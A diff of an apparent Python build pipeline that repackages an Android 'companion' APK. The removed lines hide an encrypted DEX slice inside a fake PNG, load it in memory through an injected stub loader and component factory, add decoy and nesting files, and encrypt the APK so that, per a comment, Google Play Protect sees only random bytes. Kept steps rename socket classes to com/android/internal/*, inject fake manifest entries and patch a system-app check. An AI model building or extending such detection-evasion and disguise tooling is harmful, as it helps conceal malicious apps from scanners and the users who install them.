-    if not _phase1_only and class_rename_map:
-        with track("PHASE_4", "STEP_NP_HEADER", "Write np_loader_class.h with per-build JNI class path"):
-            step_write_np_loader_header(new_pkg, class_rename_map)
-
     with track("PHASE_1", "STEP_7", "Patch findByHomeLauncher FLAG_SYSTEM check"):
         step_patch_home_launcher()
 
@@ -4151,187 +3478,8 @@ def main():
             with track("PHASE_6", "STEP_6E", "Round 2 Step 6E: Rename io/socket → com/android/internal/* (random)"):
                 step_6e_rename_socket_package(new_pkg)
 
-    # Pre-generate asset filename BEFORE STEP_9 so smali injection can reference
-    # the exact filename that STEP_DEX_SLICE will use when it creates the blob.
-    # STEP_INJECT_LOADER injects attachBaseContext + native xd() into smali;
-    # STEP_9 then rebuilds DEX with those injected methods already present.
-    _slice_asset_filename = ""
-    _slice_xor_key = b""
-    if not _phase1_only:
-        # Generate the filename now — must match what STEP_DEX_SLICE will use
-        _slice_asset_filename = "img_" + secrets.token_hex(2) + ".png"
-
-        with track("PHASE_4", "STEP_INJECT_LOADER",
-                   "Inject attachBaseContext + native xd() into companion Application smali"):
-            step_inject_native_loader(new_pkg, class_rename_map, _slice_asset_filename)
-
-    with track("PHASE_1", "STEP_8", "Restore apktool.yml with randomized version"):
-        step_restore_apktool_yml(meta)
-
-    with track("PHASE_1", "STEP_9_DEBUG", "Scan all smali for VerifyError patterns (move-exception)"):
-        step_debug_smali_verify()
-
-    with track("PHASE_1", "STEP_9", "Rebuild classes.dex via apktool"):
-        new_dex = step_rebuild_dex()
-
-    with open("new_classes.dex", "rb") as f:
-        new_dex = f.read()
-
-    # build_hash generated here — used by STEP_13_UNICODE,
-    # STEP_15_NOISE and downstream steps. Single definition, no duplication.
-    build_hash = hashlib.sha256(new_pkg.encode()).hexdigest()
-
-    # STEP_DEX_SLICE — extract io/socket (com/android/internal/*) classes,
-    # encrypt with rotating XOR + fake PNG header, inject as res/raw/img_XXXX.png.
-    # Pass the pre-generated filename so smali injection and this step use the same name.
-    if not _phase1_only and _slice_asset_filename:
-        with track("PHASE_3", "STEP_DEX_SLICE", "Extract + encrypt io/socket DEX slice → res/raw/img_XXXX.png", MOD_ASSET):
-            (_slice_asset_filename, _slice_xor_key) = step_extract_dex_slice(
-                new_dex, build_hash, asset_filename=_slice_asset_filename
-            )
-        if _slice_asset_filename:
-            print(f"  ✅ STEP_DEX_SLICE — asset: {_slice_asset_filename}, key: {_slice_xor_key.hex()[:8]}...")
-            if GITHUB_OUTPUT and os.path.isfile(GITHUB_OUTPUT):
-                with open(GITHUB_OUTPUT, "a") as _gof:
-                    _gof.write(f"dex_slice_asset={_slice_asset_filename}\n")
-                    _gof.write(f"dex_slice_key={_slice_xor_key.hex()}\n")
-
-    # ── Build stub DEX — tiny Application loader only, no business logic ────────
-    stub_dex = None
-    _smali_jar = next((p for p in ["smali.jar", "tools/smali.jar", "/usr/local/lib/smali.jar",
-                                    os.path.join(os.environ.get("GITHUB_WORKSPACE", ""), "tools", "smali.jar"),
-                                    "/usr/share/java/smali.jar"]
-                       if os.path.isfile(p)), None)
-    if _smali_jar:
-        _stub_smali_dir = "stub_smali_tmp"
-        if os.path.isdir(_stub_smali_dir):
-            shutil.rmtree(_stub_smali_dir)
-        os.makedirs(_stub_smali_dir)
-        _app_smali = None
-        for _root, _dirs, _files in os.walk("companion_decompiled/smali"):
-            for _fname in _files:
-                if _fname.endswith(".smali"):
-                    _fpath = os.path.join(_root, _fname)
-                    with open(_fpath, "r", errors="replace") as _fh:
-                        _content = _fh.read()
-                    if "attachBaseContext" in _content and (
-                            "extends Application" in _content or
-                            ".super Landroid/app/Application;" in _content):
-                        _rel = os.path.relpath(_fpath, "companion_decompiled/smali")
-                        _dst = os.path.join(_stub_smali_dir, _rel)
-                        os.makedirs(os.path.dirname(_dst), exist_ok=True)
-                        shutil.copy2(_fpath, _dst)
-                        _app_smali = _fpath
-        if _app_smali:
-            # Write StubComponentFactory.smali alongside the Application smali.
-            # This class implements AppComponentFactory (API 28+), intercepts
-            # instantiateActivity/Service/Receiver, and resolves classes via
-            # sLoader (set by attachBaseContext to the InMemoryDexClassLoader).
-            _new_path_dir = new_pkg.replace(".", "/")
-            _factory_class = class_rename_map.get("StubComponentFactory", "StubComponentFactory") if class_rename_map else "StubComponentFactory"
-            _app_class_for_smali = class_rename_map.get("App", "App") if class_rename_map else "App"
-            _factory_smali_content = f""".class public L{_new_path_dir}/{_factory_class};
-.super Landroid/app/AppComponentFactory;
-
-# Holds InMemoryDexClassLoader set by {_app_class_for_smali}.attachBaseContext()
-.field public static sLoader:Ljava/lang/ClassLoader;
-
-.method public constructor <init>()V
-    .locals 0
-    invoke-direct {{p0}}, Landroid/app/AppComponentFactory;-><init>()V
-    return-void
-.end method
-
-.method public instantiateActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
-    .locals 3
-    sget-object v0, L{_new_path_dir}/{_factory_class};->sLoader:Ljava/lang/ClassLoader;
-    if-eqz v0, :use_default
-    const/4 v1, 0x1
-    invoke-static {{p2, v1, v0}}, Ljava/lang/Class;->forName(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;
-    move-result-object v2
-    const/4 v1, 0x0
-    invoke-virtual {{v2, v1}}, Ljava/lang/Class;->getDeclaredConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
-    move-result-object v0
-    new-array v1, v1, [Ljava/lang/Object;
-    invoke-virtual {{v0, v1}}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;
-    move-result-object v0
-    check-cast v0, Landroid/app/Activity;
-    return-object v0
-    :use_default
-    invoke-super {{p0, p1, p2, p3}}, Landroid/app/AppComponentFactory;->instantiateActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
-    move-result-object v0
-    return-object v0
-.end method
-
-.method public instantiateService(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Service;
-    .locals 3
-    sget-object v0, L{_new_path_dir}/{_factory_class};->sLoader:Ljava/lang/ClassLoader;
-    if-eqz v0, :use_default
-    const/4 v1, 0x1
-    invoke-static {{p2, v1, v0}}, Ljava/lang/Class;->forName(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;
-    move-result-object v2
-    const/4 v1, 0x0
-    invoke-virtual {{v2, v1}}, Ljava/lang/Class;->getDeclaredConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
-    move-result-object v0
-    new-array v1, v1, [Ljava/lang/Object;
-    invoke-virtual {{v0, v1}}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;
-    move-result-object v0
-    check-cast v0, Landroid/app/Service;
-    return-object v0
-    :use_default
-    invoke-super {{p0, p1, p2, p3}}, Landroid/app/AppComponentFactory;->instantiateService(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Service;
-    move-result-object v0
-    return-object v0
-.end method
-
-.method public instantiateReceiver(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/content/BroadcastReceiver;
-    .locals 3
-    sget-object v0, L{_new_path_dir}/{_factory_class};->sLoader:Ljava/lang/ClassLoader;
-    if-eqz v0, :use_default
-    const/4 v1, 0x1
-    invoke-static {{p2, v1, v0}}, Ljava/lang/Class;->forName(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;
-    move-result-object v2
-    const/4 v1, 0x0
-    invoke-virtual {{v2, v1}}, Ljava/lang/Class;->getDeclaredConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
-    move-result-object v0
-    new-array v1, v1, [Ljava/lang/Object;
-    invoke-virtual {{v0, v1}}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;
-    move-result-object v0
-    check-cast v0, Landroid/content/BroadcastReceiver;
-    return-object v0
-    :use_default
-    invoke-super {{p0, p1, p2, p3}}, Landroid/app/AppComponentFactory;->instantiateReceiver(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/content/BroadcastReceiver;
-    move-result-object v0
-    return-object v0
-.end method
-"""
-            _factory_dst_dir = os.path.join(_stub_smali_dir, _new_path_dir)
-            os.makedirs(_factory_dst_dir, exist_ok=True)
-            _factory_dst = os.path.join(_factory_dst_dir, f"{_factory_class}.smali")
-            with open(_factory_dst, "w", encoding="utf-8") as _fh:
-                _fh.write(_factory_smali_content)
-            print(f"  ✅ StubComponentFactory.smali written: {_factory_dst}")
-
-            _stub_out = "stub_dex_out.dex"
-            _r = subprocess.run(
-                ["java", "-jar", _smali_jar, "assemble", _stub_smali_dir, "-o", _stub_out],
-                capture_output=True
-            )
-            if _r.returncode == 0 and os.path.isfile(_stub_out):
-                with open(_stub_out, "rb") as _f:
-                    stub_dex = _f.read()
-                os.remove(_stub_out)
-                print(f"  ✅ Stub DEX built: {len(stub_dex)} bytes (Application loader only)")
-            else:
-                print(f"  ⚠️  Stub DEX build failed: {_r.stderr.decode(errors='replace')[:200]}")
-        else:
-            print("  ⚠️  Stub DEX: Application smali not found, classes.dex will use full DEX")
-        shutil.rmtree(_stub_smali_dir, ignore_errors=True)
-    else:
-        print("  ⚠️  Stub DEX: smali.jar not found, classes.dex will use full DEX (install smali.jar in CI)")
-
     with track("PHASE_1", "STEP_10", "Patch manifest + arsc + assemble APK", MOD_ASSET):
-        step_patch_and_assemble(new_pkg, new_dex, res_rename, stub_dex=stub_dex, meta=None,
+        step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
                                 class_rename_map=class_rename_map)
     _check_string156("after STEP_10 step_patch_and_assemble")
 
@@ -4359,18 +3507,9 @@ def main():
         print(f"  ✅ Step 9A version patch applied")
     _check_string156("after STEP_9A _patch_axml_version")
 
-    if not _phase1_only:  # PHASE_2 — runs for both full build and PHASE12_ONLY
-        with track("PHASE_2", "STEP_13_UNICODE", "Deep unicode folder nesting companion [Step 13]", "companion_renamed_unsigned.apk"):
-            step_unicode_nest(build_hash)
-        _check_string156("after STEP_13_UNICODE step_unicode_nest")
-
-        with track("PHASE_2", "STEP_15_NOISE", "Decoy noise files injection [Step 15]", "companion_renamed_unsigned.apk"):
-            step_decoy_noise_files(build_hash)
-        _check_string156("after STEP_15_NOISE step_decoy_noise_files")
-
-        with track("PHASE_2", "STEP_17_MANIFEST", "Fake manifest entries injection [Step 17]", "companion_renamed_unsigned.apk"):
-            step_fake_manifest_entries()
-        _check_string156("after STEP_17_MANIFEST step_fake_manifest_entries")
+    with track("PHASE_2", "STEP_17_MANIFEST", "Fake manifest entries injection [Step 17]", "companion_renamed_unsigned.apk"):
+        step_fake_manifest_entries()
+    _check_string156("after STEP_17_MANIFEST step_fake_manifest_entries")
 
     with track("PHASE_2", "STEP_11_ZIPALIGN", "Zipalign companion APK [Step 11]", "companion_renamed_unsigned.apk"):
         step_zipalign()
@@ -4983,11 +4122,6 @@ def main():
     #   STEP_17H (res_renamer.py), STEP_REPAIR_RESMAP, STEP_17C, STEP_RESIGN_1,
     #   STEP_14_ASSET_2 (step_replace_asset).
     # After this point nothing reads MOD_ASSET as a zip — safe to encrypt.
-    # Raw APK entropy = 6.239 (GPP reads all permissions/DEX).
-    # Encrypted blob entropy = 8.000 (GPP sees random bytes only).
-    if not _phase1_only and not _phase12_only:
-        with track("PHASE_1", "STEP_ENCRYPT_COMPANION", "Encrypt companion APK binary [Step 8A FIX]", MOD_ASSET):
-            step_encrypt_companion()
 
     with open(_AUDIT_LOG, "a") as _af:
         _af.write(f"\n========================================\n")
